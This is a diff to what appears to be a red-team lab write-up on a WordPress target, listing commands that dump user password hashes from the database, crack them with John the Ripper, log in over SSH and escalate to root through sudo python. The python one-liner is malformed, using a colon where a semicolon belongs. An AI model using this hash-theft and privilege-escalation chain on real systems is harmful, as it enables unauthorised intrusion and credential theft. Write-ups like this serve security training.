@@ -68,9 +68,9 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Command run: show tables;
       - Command run: select * from wp_users;
       - Command run: SELECT user_pass FROM wp_users INTO OUTFILE '/home/wp_hashes.txt';
-      - Command run: john wp_hashes.txt 'from root user on Kali'
+      - Command run: john wp_hashes.txt `from root user on kali`
       - Command run: ssh Michael@192.168.1.110
       - Command run: su steven
-      - Command run: sudo -l
-      - Command run: sudo python -c 'import pty:pty.spawn("/bin/bash")'                       
+      - Command run: sudo -l `check aany utilities which can be used with sudo`  
+      - Command run: sudo python -c 'import pty:pty.spawn("/bin/bash")'  `root access coomand`                     
        
